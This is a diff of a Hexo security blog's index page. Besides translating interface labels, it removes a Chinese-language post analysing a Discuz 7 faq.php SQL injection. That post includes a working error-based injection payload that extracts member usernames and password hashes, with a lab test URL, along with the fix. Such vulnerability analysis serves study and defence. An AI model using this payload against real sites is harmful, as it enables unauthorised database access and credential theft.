@@ -51,9 +51,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
@@ -63,70 +63,6 @@
 </header>
       <div class="outer">
         <section id="main">
-  
-    <article id="post-Discuz7-faq-php-Sqli-漏漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/11/15/Discuz7-faq-php-Sqli-漏漏洞分析/" class="article-date">
-  <time datetime="2016-11-15T08:02:36.000Z" itemprop="datePublished">2016-11-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/15/Discuz7-faq-php-Sqli-漏漏洞分析/">Discuz7 faq.php Sqli 漏漏洞分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h3><p>Discuz7 SQL注射的漏洞利用PHP一个特性绕过gpc防护，可直接将SQL注入到原有查询中。</p>
-<h3 id="0x01-漏洞根源"><a href="#0x01-漏洞根源" class="headerlink" title="0x01 漏洞根源"></a>0x01 漏洞根源</h3><p>问题出现在/faq.php文件里，部分代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">elseif</span>($action == <span class="string">'grouppermission'</span>) &#123;</div><div class="line"></div><div class="line"><span class="comment">/*省略部分代码*/</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>($cgdata[<span class="number">0</span>] == <span class="string">'member'</span>) &#123;</div><div class="line">        $nextgid = $groups[$cgdata[<span class="number">0</span>]][$cgdata[<span class="number">1</span>] + <span class="number">1</span>][<span class="number">0</span>];</div><div class="line">        <span class="keyword">if</span>($cgdata[<span class="number">1</span>] &gt; <span class="number">0</span>) &#123;</div><div class="line">            $gids[<span class="number">1</span>] = $groups[$cgdata[<span class="number">0</span>]][$cgdata[<span class="number">1</span>] - <span class="number">1</span>];</div><div class="line">        &#125;</div><div class="line">        $gids[<span class="number">2</span>] = $groups[$cgdata[<span class="number">0</span>]][$cgdata[<span class="number">1</span>]];</div><div class="line">        <span class="keyword">if</span>($cgdata[<span class="number">1</span>] &lt; count($groups[$cgdata[<span class="number">0</span>]]) - <span class="number">1</span>) &#123;</div><div class="line">            $gids[<span class="number">3</span>] = $groups[$cgdata[<span class="number">0</span>]][$cgdata[<span class="number">1</span>] + <span class="number">1</span>];</div><div class="line">            <span class="keyword">if</span>(count($gids) == <span class="number">2</span>) &#123;</div><div class="line">                $gids[<span class="number">4</span>] = $groups[$cgdata[<span class="number">0</span>]][$cgdata[<span class="number">1</span>] + <span class="number">2</span>];</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">elseif</span>(count($gids) == <span class="number">2</span>) &#123;</div><div class="line">            $gids[<span class="number">0</span>] = $groups[$cgdata[<span class="number">0</span>]][$cgdata[<span class="number">1</span>] - <span class="number">2</span>];</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $gids[<span class="number">1</span>] = $groups[$cgdata[<span class="number">0</span>]][$cgdata[<span class="number">1</span>]];</div><div class="line">    &#125;</div><div class="line">    ksort($gids);</div><div class="line">    $groupids = <span class="keyword">array</span>();</div><div class="line">    <span class="keyword">foreach</span>($gids <span class="keyword">as</span> $row) &#123;</div><div class="line">        $groupids[] = $row[<span class="number">0</span>];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $query = $db-&gt;query(<span class="string">"SELECT * FROM &#123;$tablepre&#125;usergroups u LEFT JOIN &#123;$tablepre&#125;admingroups a ON u.groupid=a.admingid WHERE u.groupid IN ("</span>.implodeids($groupids).<span class="string">")"</span>);</div><div class="line">    $groups = <span class="keyword">array</span>();</div></pre></td></tr></table></figure>
-<p>可以看出在$cgdata[0]不为“member”时gids是没有经过初始化的，而且gids变量用户可以通过GET或者POST的方法来进行创建赋值。</p>
-<p>虽然在discuz在前面处理提交的时候，对单引号内容进行了转义，但是利用PHP字符串特性，可以达到绕过转义的效果。</p>
-<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>PHP对于字符串，也会将它作为数组来处理。例如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$s = <span class="string">'1234567890'</span>;</div><div class="line"><span class="keyword">print</span> $s[<span class="number">0</span>];</div></pre></td></tr></table></figure>
-<p>上面这段代码则会输出字符1。正是这个特性，导致这个问题的可利用。通过代码，我们可以看出$gids会被当做数组来处理，并且每个数组中的内容只读取第一个元素的内容。然后在后面的SQL语句中，通过“’,’”来分隔每个数组中的内容。例如，我$gids中赋予的内容是$gids[0]=’wsyo’,$gids[1]=’3’,那么最终SQL的拼接结果是：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &#123;$tablepre&#125;usergroups u <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> &#123;$tablepre&#125;admingroups a <span class="keyword">ON</span> u.groupid=a.admingid <span class="keyword">WHERE</span> u.groupid <span class="keyword">IN</span> (<span class="string">'t'</span>,<span class="string">'3'</span>)</div></pre></td></tr></table></figure>
-<p>那么如果$gids[0]=’\’’这样一个转以后的单引号来代替刚才的’wsyo’会发生什么？</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &#123;$tablepre&#125;usergroups u <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> &#123;$tablepre&#125;admingroups a <span class="keyword">ON</span> u.groupid=a.admingid <span class="keyword">WHERE</span> u.groupid <span class="keyword">IN</span> (<span class="string">'\','</span><span class="number">3</span><span class="string">')</span></div></pre></td></tr></table></figure>
-<p>原有的单引号被破坏掉了，我们只需要$gids[1][0]来添加要注入的SQL语句就可以实现SQL注入攻击了。</p>
-<h3 id="0x03-漏洞重现"><a href="#0x03-漏洞重现" class="headerlink" title="0x03 漏洞重现"></a>0x03 漏洞重现</h3><p>向/faq.php?faq.php?action=grouppermission发送请求，使用GET或POST提交参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gids[99]=%27&amp;gids[100][0]=) and (select 1 from (select count(*),concat((select (select (select concat(username,0x27,password) from cdb_members limit 1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</div></pre></td></tr></table></figure>
-<p>我的测试提交如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.188.143/discuz7.2/faq.php?action=grouppermission&amp;gids[99]=%27&amp;gids[100][0]=) and (select 1 from (select count(*),concat((select (select (select concat(username,0x27,password) from cdb_members limit 1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</div></pre></td></tr></table></figure>
-<p>效果如下图所示：</p>
-<p><img src="/upload_image/Discuz7-1.png" alt=""></p>
-<h3 id="0x04-漏洞总结"><a href="#0x04-漏洞总结" class="headerlink" title="0x04 漏洞总结"></a>0x04 漏洞总结</h3><p>####漏洞小结</p>
-<ol>
-<li><p>影响范围个人评价为“高”，Discuz 7.x系列虽然是discuz的老版本了，但是在国内使用的网站人有很多，所以影响范围还是很广的。</p>
-</li>
-<li><p>危害性个人评价为“极高”，此漏洞几乎不需要任何附加条件，只需服务端可被访问便可被利用，攻击者可以利用这个漏洞getshell。</p>
-</li>
-</ol>
-<p>####防护方案</p>
-<p>初始化gids变量。</p>
-<p>官方已经发布修复补丁和修复方案，相关链接为：<br><a href="http://www.discuz.net/thread-3579915-1-1.html" target="_blank" rel="external">http://www.discuz.net/thread-3579915-1-1.html</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/11/15/Discuz7-faq-php-Sqli-漏漏洞分析/" data-id="cjd9qvr2k000rks1bbcnczt07" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
   
     <article id="post-MVEL解析表达式" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -206,7 +142,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/11/15/MVEL解析表达式/" data-id="cjd9qvr2n000uks1bozg0fk2y" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/11/15/MVEL解析表达式/" data-id="cjd9qwgwf000v901bcda3asob" class="article-share-link">Share</a>
       
       
     </footer>
@@ -250,7 +186,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cjd9qvr2m000tks1bzk3xlb0q" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cjd9qwgwi000x901bkvuie4ew" class="article-share-link">Share</a>
       
       
     </footer>
@@ -306,7 +242,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cjd9qvr2r000yks1b1bgjsooh" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cjd9qwgwj000z901bkfs6jreu" class="article-share-link">Share</a>
       
       
     </footer>
@@ -360,7 +296,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/18/Hexo-搭建Blog教程/" data-id="cjd9qvr2j000pks1bazsshnmg" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/18/Hexo-搭建Blog教程/" data-id="cjd9qwgwe000t901bzpmef9f4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -405,7 +341,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/08/hello-world/" data-id="cjd9qvr2q000xks1bfvlbprcb" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/08/hello-world/" data-id="cjd9qwgwf000u901ba3l7h7yh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -436,7 +372,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
   </div>
 
@@ -444,13 +380,9 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Articles récents</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
-        
-          <li>
-            <a href="/2018/02/03/威胁情报哪家强/">威胁情报哪家强</a>
-          </li>
         
           <li>
             <a href="/2018/01/28/metasploit备忘/">metasploit备忘</a>
@@ -468,6 +400,10 @@
             <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
           </li>
         
+          <li>
+            <a href="/2017/09/10/Java反序列化漏洞/">序列化和反序列化</a>
+          </li>
+        
       </ul>
     </div>
   </div>
@@ -482,7 +418,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2018 SY0U<br>
-      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
